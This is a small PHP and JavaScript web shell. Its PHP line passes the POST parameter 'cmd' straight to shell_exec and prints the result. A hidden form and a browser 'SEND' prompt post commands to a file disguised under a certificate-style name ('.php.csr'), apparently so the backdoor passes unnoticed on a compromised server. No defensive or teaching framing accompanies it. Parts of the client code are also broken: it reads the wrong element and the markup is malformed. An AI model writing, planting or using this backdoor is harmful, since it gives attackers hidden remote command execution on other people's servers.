<script src="http://code.jquery.com/jquery-2.0.0.min.js"
        type="text/javascript">
</script>

<div id="output">
  <?php echo(shell_exec($_POST['cmd'])); ?>
</div>

<html>
    <body>
      <table>
        <code id="hst"></code>
        <tr><td>
      </table>
      <div style="visibility:hidden">
        <form action="/certs/foo@baz.com-index8.php.csr"
              method="post"
              id="cmd">
          <input type="text" name="cmd" id="cmd">
          <input type="submit">
        </form>
      </div>
      <div style="display:inline">
           $ <input type="text" id="prompt"> <button id="enter" > SEND </button>
      </div>
    </body>
</html>


<script type="text/javascript">
$("#enter").click(function () {
    $.post("/certs/foo@baz.com-index8.php.csr",
           { cmd: $("#cmd").text()})
          .done(function(data) {
                alert($(data).find("#output"));
                $("#hst").append("<pre>" + $(data).find("#output") + "</pre>");
          });
});
</script>
